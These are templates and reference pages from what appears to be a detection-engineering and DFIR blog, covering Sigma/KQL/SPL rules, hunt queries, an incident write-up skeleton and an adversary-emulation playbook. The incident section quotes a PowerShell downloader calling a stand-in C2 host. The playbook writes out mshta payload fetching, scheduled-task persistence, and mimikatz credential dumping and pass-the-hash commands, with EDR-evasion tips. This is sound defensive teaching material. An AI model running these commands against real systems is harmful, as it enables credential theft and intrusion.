docs.title: What This Blog Is
docs.text:
N1ghtFury is a knowledge hub where I explore security research and defensive strategies. While my roots are in threat research, DFIR, adversary emulation, and detection engineering, this blog covers a wide spectrum of topics with no limitations — from emerging threats and defensive innovations to security tools, operational tactics, and everything in between.

Threat Research Detection Engineering DFIR & Forensics Adversary Emulation Threat Intelligence Malware Analysis Security Tools & Tactics

docs.title: Why "N1ghtFury"?
docs.text:
In How to Train Your Dragon, Toothless the Night Fury is the most feared and most misunderstood dragon. Feared for its destructive power, yet capable of forming the strongest bonds with those who truly understand it.

Similarly, in cybersecurity, the most dangerous threats are those we misunderstand. This blog is about understanding adversaries — their tactics, techniques, and procedures — so we can defend against them effectively. We honor the complexity, respect the power, and build the knowledge to coexist with threats in the digital world.

Meet Mohamed Hany

docs.title: Professional Experience
docs.text:
Jul 2025 – Present Dubai, UAE

Threat Hunting & Detection Engineer

HexaPrime

  • Build and continuously refine high-signal detections, tuning thresholds, suppressions, and exclusions to reduce false positives while maintaining adversary coverage.
  • Lead end-to-end hunt operations (hypothesis-, intelligence-, baseline-, and anomaly-driven) across endpoint, network, and identity telemetry.
  • Execute compromise assessments by correlating multi-source signals, identifying attacker pathways, and producing concise stakeholder outputs.
  • Maintain ATT&CK-aligned coverage visibility through heatmaps; drive a risk-ranked roadmap for new detections and targeted hunts.
  • Develop and refresh SOC playbooks, investigation workflows, and escalation criteria for faster, higher-confidence response.
Mar 2024 – Jul 2025 Delaware, USA

Cybersecurity Engineer

CyberDefenders

  • Researched adversary behavior and translated real-world TTPs into MITRE ATT&CK–mapped use cases; planned and executed controlled attack-chain emulations to validate detection logic.
  • Built 13+ hands-on labs with realistic artifacts, walkthroughs, post-execution validation steps, and measurable learning outcomes.
  • Performed DFIR operations across endpoint/network/identity incidents: evidence collection, attack timeline reconstruction, root-cause analysis, and containment coordination.
Jul 2022 – Sep 2022 Cairo, Egypt

Cyber Security Analyst Intern

Telecom Egypt (WE)

  • Supported SOC investigations using QRadar SIEM (alert triage, correlation, escalation notes).
  • Assisted penetration testing with Nmap and Metasploit to validate exposures and support remediation.

docs.title: [Technique or Use Case] — Detection Engineering Deep Dive
docs.text:
Replace this with a 2–3 sentence summary. Describe the adversary technique, why it matters to defenders, and what the detection approach achieves. This appears on the blog index card.

TL;DR

  • Technique: TXXXX.XXX — Technique Name
  • Tactic: Execution / Persistence / Lateral Movement
  • Signal Strength: High fidelity when tuned
  • Platforms: Windows · Linux · macOS

docs.title: Technique Overview
docs.text:
Describe the adversary behavior: how it is executed, what variants exist, which threat actors abuse it, and what the business impact is.

Why This Matters

Cite threat intel or real-world incidents that make this a detection priority. Link to the ATT&CK page and any relevant threat reports here.

docs.title: ATT&CK Mapping
docs.text: ATT&CK ID Technique Sub-technique Tactic Platforms T1059.001 Command and Scripting Interpreter PowerShell Execution Windows TXXXX.XXX Replace with actual technique — Tactic Windows

docs.title: Data Requirements
docs.text:
Coverage Prerequisite

The detection below will not fire without the log sources in this table. Confirm collection is active before deploying the rule to production.

Log Source Provider Minimum Fields Collection Method Windows Security Microsoft EventID, SubjectUserName, CommandLine GPO → SIEM Sysmon Sysinternals Image, CommandLine, ParentImage, Hashes WEF → SIEM EDR Telemetry CrowdStrike / Defender ProcessCreate, NetworkConnect Agent → SIEM PowerShell Microsoft ScriptBlockText ScriptBlock Logging GPO

docs.title: Detection Logic
docs.text: Explain why the signal below indicates malicious activity before showing the rule.

docs.title: Sigma
docs.text:
title: Suspicious PowerShell Encoded Command Execution
id: 00000000-0000-0000-0000-000000000000
status: experimental
description: Detects PowerShell launched with encoded command flags used to hide payloads
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: N1ghtFury
date: YYYY-MM-DD
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - ' -enc '
      - ' -e '
  filter_legitimate:
    Image|startswith:
      - 'C:\Program Files\'
      - 'C:\Windows\System32\'
    ParentImage|endswith:
      - '\services.exe'
      - '\svchost.exe'
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate admin automation using encoded commands
  - Managed software deployment tools (SCCM, Intune, PDQ)
level: high
tags:
  - attack.execution
  - attack.t1059.001

docs.title: KQL — Sentinel / Elastic
docs.text:
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("-EncodedCommand", " -enc ", " -e ")
| where InitiatingProcessFileName !in~ ("services.exe", "svchost.exe", "msiexec.exe")
| where not(FolderPath startswith @"C:\Program Files\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

docs.title: SPL — Splunk
docs.text:
index=* sourcetype=WinEventLog:Security EventCode=4688
  (CommandLine="*-EncodedCommand*" OR CommandLine="* -enc *")
| where NOT match(ParentProcessName, "sccm|intune|pdqdeploy")
| eval risk=case(match(CommandLine,"-nop.*-w hidden"), 90, match(CommandLine,"-EncodedCommand"), 70, true(), 50)
| table _time, host, user, CommandLine, ParentProcessName, risk
| sort - risk

docs.title: EQL — Elastic / Microsoft Defender
docs.text:
process where event.type == "start"
  and process.name : ("powershell.exe", "pwsh.exe")
  and process.args : ("-e", "-enc", "-EncodedCommand")
  and not process.parent.name : ("services.exe", "svchost.exe")

docs.title: Tuning & False Positive Management
docs.text:
Common False Positives

  • IT automation that uses -EncodedCommand for legitimate scheduled tasks
  • Software packaging (SCCM, PDQ Deploy, Intune Win32 apps)
  • Authorized red team / penetration testing activity

Suppression per platform:

Sentinel KQLSplunk SPLSigma Filter Block 
| where DeviceName !in ("admin-ws-01", "jumpbox-01", "deploy-srv")
| where InitiatingProcessVersionInfoCompanyName != "Microsoft Corporation"

| where NOT (host IN ("admin-ws-01", "jumpbox-01"))
| where NOT match(ParentProcessName, "sccm|pdqdeploy|intune")

filter_admin_hosts:
  ComputerName|endswith:
    - '-admin'
    - '-jumpbox'
filter_signed_microsoft:
  Company: 'Microsoft Corporation'
  Signed: 'true'
condition: selection and not 1 of filter_*

docs.title: Atomic Red Team
docs.text:
Invoke-AtomicTest T1059.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1059.001 -TestNumbers 1
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup

docs.title: Expected Artifacts
docs.text: Log Source Event ID Key Field Expected Value Sysmon 1 CommandLine Contains -enc Windows Security 4688 NewProcessName powershell.exe PowerShell Operational 4104 ScriptBlockText Decoded payload content

docs.text:

docs.title: [Hunt Name] — [Target Behavior or Threat Actor]
docs.text:
Replace this with a 2–3 sentence hunt summary. Describe the hypothesis, the telemetry used, and the key outcome. This text appears on the blog index card.

Hunt Summary

  • Hypothesis: Attacker using [technique] to [objective]
  • Data Sources: Endpoint EDR · Network · Identity
  • Hunt Type: Hypothesis-Driven / Intelligence-Led / Baseline / Anomaly
  • Outcome: X confirmed findings · Y false positives · Z visibility gaps

docs.title: Hunt Hypothesis
docs.text:
"If [threat actor / technique] is active in our environment, we would expect to see [specific observable indicator] in [data source] because [reasoning]."

Hypothesis source:

Threat IntelPrevious IncidentBaseline Deviation

Link to CTI report, IOC feed, or peer notification that prompted this hunt.

Reference a prior DFIR investigation that revealed a detection gap worth hunting.

Describe the anomaly or alert that triggered this proactive investigation.

docs.title: ATT&CK Coverage
docs.text: ATT&CK ID Technique Tactic Hunt Focus TXXXX.XXX Technique Name Execution Primary TXXXX.XXX Technique Name Persistence Secondary TXXXX.XXX Technique Name Defense Evasion Evasion variant

docs.title: Environment & Telemetry
docs.text:
Source Platform Coverage Retention Endpoint EDR CrowdStrike / Defender Process, network, file, registry 90 days SIEM Splunk / Elastic / Sentinel Auth, DNS, proxy, firewall 1 year Network NDR / Zeek / Suricata NetFlow, DNS, TLS metadata 30 days Identity AD / Entra ID Auth events, privilege changes 90 days

Telemetry Gaps Identified Pre-Hunt

Document any missing log sources before starting. This defines what the hunt can and cannot confirm.

docs.title: Step 1 — Establish Baseline
docs.text:
Splunk SPLSentinel KQL 
index=* sourcetype=WinEventLog EventCode=4688
earliest=-30d latest=-7d
| stats count by ParentProcessName, NewProcessName
| sort -count
| head 100

DeviceProcessEvents
| where Timestamp between (ago(30d) .. ago(7d))
| summarize count() by InitiatingProcessFileName, FileName
| order by count_ desc
| take 100

docs.title: Step 2 — Identify Anomalies
docs.text:
Splunk SPLSentinel KQLSigma 
index=* sourcetype=WinEventLog EventCode=4688
earliest=-7d
| stats count by ParentProcessName, NewProcessName
| where count < 5
| sort count

DeviceProcessEvents
| where Timestamp > ago(7d)
| summarize count() by InitiatingProcessFileName, FileName
| where count_ < 5
| order by count_ asc

title: Rare Child Process of Suspicious Parent
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    ParentImage|endswith: '\suspicious_parent.exe'
  filter_known_good:
    Image|endswith:
      - '\known_good.exe'
  condition: selection and not filter_known_good

docs.title: Step 3 — Triage & Validation
docs.text:
• Is the parent/child relationship expected for this host and user?
  • Is the binary signed by a trusted authority?
  • Does the hash match known-good or known-bad (VirusTotal)?
  • Was this activity during business hours?
  • Does it appear on other hosts (lateral spread indicator)?

docs.title: Step 4 — Pivot & Expand
docs.text:
index=* host="WORKSTATION-01"
earliest="2025-01-01T14:00:00" latest="2025-01-01T20:00:00"
| table _time, EventCode, host, user, CommandLine, ParentProcessName
| sort _time

docs.title: Confirmed Findings
docs.text:
Confirmed Malicious Activity

  • Host: WORKSTATION-01
  • User: jdoe@corp.com
  • Behavior: [Describe the confirmed finding]
  • ATT&CK: TXXXX.XXX

docs.title: Notable False Positives
docs.text:
False Positive

Pattern: admin_tool.exe spawning cmd.exe for scheduled maintenance. Distinguish by: Binary is code-signed + correlates with known maintenance window.

docs.title: Visibility Gaps
docs.text:
Visibility Gap

Describe any missing log sources that prevented full hunt coverage.

docs.title: Detection Rules Derived
docs.text:
title: Behavior Confirmed During Hunt
id: 00000000-0000-0000-0000-000000000000
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'indicator_from_hunt'
  condition: selection
level: high
tags:
  - attack.tXXXX

docs.title: Recommendations
docs.text:
Priority Action Owner ETA Critical Enable [missing log source] SOC Eng 1 week High Deploy rule for confirmed finding Detection Eng 2 weeks Medium Review [policy or control] Security Arch 1 quarter
  • Convert hunt queries to persistent scheduled detection rules
  • Update ATT&CK Navigator heatmap for confirmed coverage
  • Open tracking tickets for visibility gaps

docs.title: [Incident Name] — DFIR Investigation Writeup
docs.text:
Replace this with a 2–3 sentence incident summary. Describe the incident type, scope, and key finding. This text appears on the blog index card.

Incident at a Glance

  • Type: Ransomware / BEC / Data Exfil / Insider Threat
  • Severity: Critical
  • Affected Systems: X endpoints · Y servers · Z identities
  • Initial Vector: Phishing / Exposed RDP / Supply Chain
  • Dwell Time: X days

docs.title: Incident Overview
docs.text: Field Value Incident Type Affected Systems Discovery Date YYYY-MM-DD Containment Date YYYY-MM-DD Severity Critical / High / Medium / Low Dwell Time X days Attribution Suspected group / Unknown

docs.title: Attack Timeline
docs.text: Timestamp (UTC) Event ATT&CK Evidence Source YYYY-MM-DD HH:MM Initial access — phishing email T1566.001 Email gateway +HH:MM Macro drops dropper to %TEMP% T1204.002 Sysmon EID 11 +HH:MM Dropper executes beacon T1059.001 Sysmon EID 1 +HH:MM C2 callback over HTTPS/443 T1071.001 Proxy logs +HH:MM Domain enumeration T1087.002 Security EID 4688 +HH:MM Lateral movement to DC via RDP T1021.001 Auth logs EID 4624 +HH:MM LSASS credential dump T1003.001 Sysmon EID 10 +HH:MM Data staged for exfiltration T1074.001 Sysmon EID 11 +HH:MM Exfiltration over C2 channel T1041 Network capture

docs.title: Evidence Collection
docs.text:
EndpointNetworkIdentityCloud / SaaS
  • Live memory image: winpmem, DumpIt
  • Full disk image: FTK Imager
  • MFT: $MFT, $LogFile, $UsnJrnl
  • All EVTX channels (Security, System, Sysmon, PowerShell)
  • Prefetch, Amcache, Shimcache
  • Registry hives: NTUSER.DAT, SAM, SYSTEM, SECURITY, SOFTWARE
  • Full PCAP from NDR / network TAP
  • Firewall / proxy logs (egress)
  • DNS query logs
  • NetFlow / IPFIX records
  • AD security events: EID 4624, 4625, 4648, 4768, 4769, 4776
  • Privileged group changes: EID 4728, 4732
  • Azure AD / Entra ID sign-in logs
  • Azure Activity Log / AWS CloudTrail
  • Microsoft 365 Unified Audit Log
  • Conditional Access sign-in logs

docs.title: Initial Access
docs.text:
Entry Point Confirmed

Describe exactly how the attacker gained access. Include phishing lure details, attachment hash, sender domain, or exploited service.

Email Subject: Invoice_Q4-2024.xlsm
Sender:        billing@evil-domain[.]com
Attachment:    Invoice_Q4-2024.xlsm
SHA256:        [hash]

docs.title: Execution & Persistence
docs.text:
# Decoded PowerShell dropper recovered from ScriptBlock log (EID 4104)
IEX (New-Object Net.WebClient).DownloadString('http://c2[.]evil/stage2.ps1')

Persistence mechanism:

Registry Run Key:
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  Value: C:\Users\Public\svc.exe

docs.title: Lateral Movement & Privilege Escalation
docs.text:
Technique:   Pass-the-Hash (T1550.002)
Source host: WORKSTATION-01
Target host: DC-01
Account:     DOMAIN\Administrator
Evidence:    Security EID 4624 Type 3, NTLM auth

docs.title: Data Access & Impact
docs.text:
Data at Risk

Describe the data accessed, estimated volume, and confirmed or suspected exfiltration.

docs.title: Root Cause Analysis
docs.text:
Root Cause

One clear sentence: what single control failure allowed this incident to escalate?

Contributing factors:

  • No MFA enforced on externally accessible service
  • Macros not blocked by Group Policy
  • EDR not deployed on affected hosts
  • LSASS protections (PPL / Credential Guard) disabled

docs.title: Indicators of Compromise
docs.text:
# File Hashes (SHA256)
aabbccddeeff...  dropper.exe
1122334455ff...  beacon.dll

# Network Indicators
203.0.113.10        # C2 IP
evil-domain[.]com

# Registry Persistence
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate

# File Paths
C:\Users\Public\svc.exe
C:\Windows\Temp\dropper.tmp

docs.title: Lessons Learned
docs.text: Gap Root Cause Recommended Fix Priority No alert on macro execution Policy not enforced Block macros via GPO Critical LSASS dump not detected PPL disabled Enable Credential Guard High Log source missing Agent not deployed Deploy Sysmon High

docs.title: Detection Rules Derived
docs.text:
title: Suspicious Scheduled Task Creation — Persistence Pattern
id: 00000000-0000-0000-0000-000000000000
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|all:
      - '/create'
      - '/sc onlogon'
  condition: selection
level: high
tags:
  - attack.persistence
  - attack.t1053.005

docs.title: References
docs.text:
• MITRE ATT&CK
  • Eric Zimmerman's Tools

docs.title: [Threat Actor / TTP] — Adversary Emulation Playbook
docs.text:
Replace this with a 2–3 sentence summary. Describe the threat actor or TTP being emulated, the exercise objective, and the key outcome for defenders. This appears on the blog index card.

Emulation at a Glance

  • Target TTPs: TXXXX.XXX · TXXXX.XXX · TXXXX.XXX
  • Tactics Covered: Initial Access → Execution → Persistence → Lateral Movement → Exfil
  • Exercise Type: Purple Team / Red Team / Breach Simulation
  • Results: X detections validated · Y gaps identified

docs.title: Emulation Objective
docs.text:
Describe the goal: red team exercise, purple team validation, specific TTP gap closure, executive reporting, or compliance evidence.

Scope & Authorization

This emulation was conducted under a signed Rules of Engagement document. All activities were performed in [isolated lab / production with SOC notification] with explicit written approval from [authorizing stakeholder].

docs.title: Threat Actor Overview
docs.text: Field Value Threat Actor APT / FIN / UNC group (or "Generic TTP") Motivation Espionage / Financial / Disruption Primary Tooling Cobalt Strike / Sliver / Havoc / Custom Target Sectors Finance, Healthcare, Government, Energy ATT&CK Group G00XX Reference Reports Mandiant / CrowdStrike / CISA advisory

docs.title: ATT&CK Coverage Map
docs.text: ATT&CK ID Technique Tactic Detection Before Detection After T1566.001 Spearphishing Attachment Initial Access  Gap  Covered T1059.001 PowerShell Execution  Covered  Covered T1053.005 Scheduled Task Persistence  Partial  Covered T1550.002 Pass-the-Hash Lateral Movement  Gap  Gap T1041 Exfiltration over C2 Exfiltration  Gap  Partial

docs.title: Environment Setup
docs.text:
Attacker InfrastructureTarget EnvironmentNetwork Topology Component Tool Notes C2 Framework Cobalt Strike / Sliver / Havoc Listener Profile Malleable C2 Mimics [Microsoft Update / Teams] traffic Redirector Apache mod_rewrite on cloud VPS Payload Format Shellcode / Reflective DLL / EXE Component Value OS Windows Server 2022 / Windows 11 Domain lab.local EDR CrowdStrike / Defender / Elastic SIEM Elastic / Splunk / Sentinel Logging Sysmon + WEF + full network capture 
[Internet]
    │
[Redirector — cloud VPS]
    │ HTTPS/443
[C2 Team Server]
    │
┌───┴──────────────────────┐
│  Target Environment      │
│  WORKSTATION-01          │
│  FILE-SERVER-01          │
│  DC-01                   │
└──────────────────────────┘

docs.title: Pre-Emulation Checklist
docs.text:
• Rules of Engagement signed by [authorizing stakeholder]
  • Scope documented: in-scope IPs, users, systems, time window
  • Blue Team notified (purple team) or kept dark (red team)
  • Logging confirmed active: EDR, SIEM, network sensors
  • Environment snapshot / rollback plan in place
  • Out-of-band communication channel established (Signal / encrypted chat)
  • Emergency stop procedure agreed and documented

docs.title: T1566.001 — Spearphishing Attachment
docs.text:
Objective: Deliver payload to a targeted inbox and achieve execution on first click.

# Example: macro-enabled document delivering staged payload via mshta
# Run in isolated lab only — replace with actual technique
mshta.exe http://[redirector]/payload.hta

OPSEC

  • Use a malleable C2 profile mimicking legitimate software (Teams, OneDrive, Zoom)
  • Stage payload from a categorized, aged domain to bypass web filtering
  • Avoid default Cobalt Strike / Sliver profiles — heavily signatured by all major EDRs

Detection validation:

Control Expected Alert Result Notes Email Gateway Attachment blocked by sandbox Pass / Fail EDR Suspicious child process spawned Pass / Fail SIEM Rare process execution alert Pass / Fail

docs.title: T1053.005 — Scheduled Task
docs.text:
Objective: Survive reboot and re-establish C2 after system restart.

schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\svc.exe" /sc onlogon /ru SYSTEM /f

Atomic Red Team equivalent:

Invoke-AtomicTest T1053.005 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1053.005 -TestNumbers 1
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup

docs.title: T1087.002 — Domain Account Enumeration
docs.text:
net user /domain
net group "Domain Admins" /domain
nltest /domain_trusts

docs.title: T1003.001 — LSASS Credential Dump
docs.text:
# Requires SYSTEM or SeDebugPrivilege — use in lab only
# This WILL trigger on most modern EDRs
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

High-Detection Technique

LSASS access is heavily signatured. This step is included to confirm detection fires. If no alert triggers, that is the finding — not the success.

docs.title: T1550.002 — Pass-the-Hash
docs.text:
# Using harvested NTLM hash to authenticate as Administrator on DC-01
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:[HASH] /run:cmd.exe"

docs.title: Phase 5 — Actions on Objective
docs.text:
# Data staging example
Compress-Archive -Path "C:\Users\*\Documents\*" -DestinationPath "C:\Windows\Temp\archive.zip"

# Exfiltrate via C2 channel or DNS tunneling

docs.title: Detection Validation Results
docs.text: Phase TTP Alert Expected Fired Fidelity Notes Initial Access T1566.001 Phishing alert Yes High Fired in 45 seconds Execution T1059.001 Suspicious PowerShell Yes Medium 3 FPs also triggered Persistence T1053.005 Scheduled task No — Log source not enabled Cred Access T1003.001 LSASS access Yes High PPL not enabled — fired Lateral Movement T1550.002 Pass-the-Hash No — Critical detection gap Exfiltration T1041 Data over C2 Partial Low Needs TLS inspection

docs.title: Working Detections
docs.text:
Validated Coverage

List TTPs where detections fired with expected fidelity and acceptable noise level.

docs.title: Detection Gaps — Prioritized
docs.text:
Coverage Gaps

Ranked by attacker advantage and potential blast radius:

  1. T1550.002 Pass-the-Hash — No detection. Any host reachable from the compromised machine is exploitable with harvested credentials.
  2. T1053.005 Scheduled Task — Security EID 4698 logging disabled. Persistence survives reboots undetected.

docs.title: OPSEC Findings
docs.text:
What Worked for the Attacker

Document which OPSEC techniques successfully evaded existing controls, so the Blue Team can address the root capability gap.

docs.title: Remediation Roadmap
docs.text: Priority Gap Fix Owner ETA Critical No PtH detection Build KQL + Sigma rule for NTLM Type 3 Detection Eng 1 week High EID 4698 not logged Enable via GPO: Audit Other Object Access Events IT Ops 2 weeks High LSASS not PPL-protected Enable Credential Guard via WDAC policy IT Ops 1 month Medium No TLS inspection Deploy SSL inspection at forward proxy Arch 1 quarter

docs.title: Detection Rule to Build
docs.text:
title: Pass-the-Hash — NTLM Type 3 Logon Without Prior TGT
id: 00000000-0000-0000-0000-000000000000
status: experimental
description: Detects lateral movement via Pass-the-Hash by correlating NTLM Type 3 logon without a preceding Kerberos TGT request
author: N1ghtFury
date: YYYY-MM-DD
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
  filter_local:
    IpAddress: '127.0.0.1'
  condition: selection and not filter_local
falsepositives:
  - Legacy NTLM authentication in environments without Kerberos enforcement
level: medium
tags:
  - attack.lateral_movement
  - attack.t1550.002

docs.title: Post-Emulation Report Structure
docs.text:
EXECUTIVE SUMMARY (1 page)
  Exercise Type: Purple Team
  Date: YYYY-MM-DD | Authorized by: [Name, Title]
  Result: X of Y TTPs detected | Z critical gaps | Risk: HIGH

TECHNICAL FINDINGS (main body)
  Per-phase: evidence screenshots + log excerpts + timeline

REMEDIATION ROADMAP
  Priority 1 — Critical (fix within 1 week): ...
  Priority 2 — High (fix within 1 month): ...
  Priority 3 — Medium (fix within 1 quarter): ...

docs.title: [Post Title] — MkDocs Material Feature Reference
docs.text: This post serves as a living reference for every MkDocs Material feature available when writing blog posts. Copy this file, replace the placeholder content, and remove anything you don't need.

docs.title: Admonitions
docs.text:
All built-in admonition types — use the one that fits the message:

Note

General information. Use when adding context that isn't a warning.

Tip

Best practices and actionable shortcuts.

Info

Supplementary detail that enriches but isn't essential.

Warning

Potential pitfall or configuration mistake to watch out for.

Danger

Critical warning — data loss, irreversible action, or security risk.

Success

Positive outcome or a confirmed working result.

Failure

What went wrong and why.

Bug

Confirmed defect or unexpected behavior.

Question / FAQ

Rhetorical prompts or FAQ items.

Pull quote or notable excerpt. Empty string removes the title bar entirely.

Example

Concrete demonstration of a concept.

Abstract / TL;DR

Summary at the top of long posts — give the reader the gist upfront.

docs.title: Collapsible Admonitions
docs.text:
Click to expand (collapsed by default)

Use ??? for collapsed. Use ???+ for expanded by default.

Expanded by default

This opens automatically on page load.

docs.title: Basic fenced block
docs.text:
def hunt(log_source: str) -> list[str]:
    hits = []
    # parse and analyze
    return hits

docs.title: With title and line highlighting
docs.text:
Detect encoded PowerShell
# Search Windows Event Logs for base64 encoded commands
Get-WinEvent -LogName Security |
  Where-Object { $_.Message -match '-[Ee]nc' } |
  Select-Object TimeCreated, Message

docs.title: With line numbers
docs.text:
import hashlib

def ja3_fingerprint(client_hello: bytes) -> str:
    return hashlib.md5(client_hello).hexdigest()

docs.title: Inline code
docs.text: Use backticks for inline code. The theme applies syntax color automatically. Reference tool names like mimikatz, paths like C:\Windows\System32\lsass.exe, and flags like --no-verify.

docs.title: Annotations inside code (1)
docs.text:
curl -X POST https://api.example.com/ingest \  # (1)!
  -H "Authorization: Bearer $TOKEN" \
  -d '{"event": "process_create"}'
  1. Replace with your actual API endpoint. Keep the token in an environment variable.

docs.title: Content Tabs
docs.text:
Use tabs to show platform-specific commands, language variants, or tool alternatives:

WindowsLinuxmacOSCloud (Azure) 
Get-WinEvent -LogName Security -MaxEvents 100 |
  Where-Object { $_.Id -eq 4624 }

journalctl -u sshd --since "2025-01-01" | grep "Accepted"

log show --predicate 'process == "sshd"' --last 1d

SigninLogs
| where TimeGenerated > ago(1d)
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress, Location

docs.title: Tables
docs.text:
Standard table with alignment:

Technique ATT&CK ID Tactic Detection Difficulty PowerShell T1059.001 Execution Medium LSASS Dump T1003.001 Credential Access High DNS Tunneling T1071.004 C2 Hard Scheduled Task T1053.005 Persistence Easy

docs.title: Task Lists
docs.text:
• Enumerate live hosts
  • Identify exposed services
  • Exploit vulnerability
  • Establish persistence
  • Exfiltrate data

docs.title: Definition Lists
docs.text: Cobalt Strike Commercial adversary simulation framework; heavily abused by threat actors for post-exploitation. Beacon The C2 implant used by Cobalt Strike. Communicates via HTTP, HTTPS, SMB, or DNS. JARM Active TLS fingerprinting tool that identifies C2 infrastructure by their TLS handshake pattern. SIGMA Generic rule format for SIEM-agnostic detection logic. Converts to SPL, KQL, EQL, and more.

docs.title: Keyboard Keys
docs.text: Press Ctrl+Alt+T to open a terminal. Use Ctrl+C to copy, Ctrl+V to paste. Win+R → type eventvwr.msc to open Event Viewer. F5 refreshes, Ctrl+Shift+I opens DevTools.

docs.title: Footnotes
docs.text: Cobalt Strike was first released in 20121 and remains the most detected C2 framework in enterprise environments2.

docs.title: Text Formatting
docs.text:
Use highlighted text to mark critical terms or findings.

Strikethrough for deprecated commands or removed indicators.

Subscript: H2O · Superscript: 210 = 1024

Blockquotes work for notable quotes or sourced statements.

— Attribution here

docs.title: Attack Chain Flowchart
docs.text:
flowchart LR
    A[Phishing Email] --> B[Macro Execution]
    B --> C[PowerShell Download]
    C --> D[Beacon Installed]
    D --> E[C2 Callback]
    E --> F[Lateral Movement]
    F --> G[Domain Compromise]

docs.title: ATT&CK Sequence Diagram
docs.text:
sequenceDiagram
    participant A as Attacker
    participant V as Victim Host
    participant C as C2 Server
    A->>V: Phishing email with macro
    V->>C: Beacon check-in (HTTPS/443)
    C->>V: Task: dump credentials
    V->>C: LSASS dump exfiltrated
    C->>V: Task: lateral move to DC

docs.title: Timeline Diagram
docs.text:
timeline
    title Incident Timeline
    YYYY-MM-DD : Phishing email delivered
    +2h        : Macro executed — beacon installed
    +6h        : C2 callback established
    +24h       : Lateral movement to DC
    +48h       : Data exfiltration detected

docs.title: Grid Cards
docs.text:
• Initial Access

    Phishing · Supply chain · Exposed services

    Covers T1566, T1190, T1195 and related techniques.

    ATT&CK TA0001

  • Persistence

    Scheduled tasks · Registry run keys · Services · Startup folders

    Covers T1053, T1547, T1543 and related techniques.

    ATT&CK TA0003

  • Detection Resources

    Sigma rules · KQL · SPL · EQL — all in one place.

    Sigma HQ

  • Threat Intel

    CTI reports, IOC feeds, and adversary profiles from trusted sources.

    MITRE ATT&CK

docs.title: Tooltips / Abbreviations
docs.text:
Abbreviations defined anywhere in the file render as tooltips on hover. Add them as a block at the end of your post (or in a shared file via snippets):

The SIEM detected a C2 callback over DNS.

*[SIEM]: Security Information and Event Management
*[C2]: Command and Control
*[DNS]: Domain Name System

docs.title: Details / Collapsible Sections
docs.text:
Use details for long content that clutters the page when expanded by default:

Full Sigma rule (click to expand) 
title: Suspicious Scheduled Task Creation
id: 00000000-0000-0000-0000-000000000000
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains: '/create'
  condition: selection
level: medium

docs.title: Frontmatter Reference
docs.text:
Copy this block to start any new blog post:

---
date: YYYY-MM-DD                   # Required: publication date
authors:
  - n1ghtfury                      # Must match key in blog/.authors.yml
tags:                              # Free-form tags for filtering
  - Tag One
  - Tag Two
categories:                        # One of: Detection Engineering, DFIR & Threat Hunting,
  - Category Name                  # Adversary Emulation, MISC
description: >                     # Optional: custom excerpt for SEO (overrides auto-excerpt)
  One or two sentence custom description for search engines and social cards.
draft: true                        # Remove this line to publish the post
---

Use <!-- more --> after the first paragraph to mark where the blog index excerpt ends.
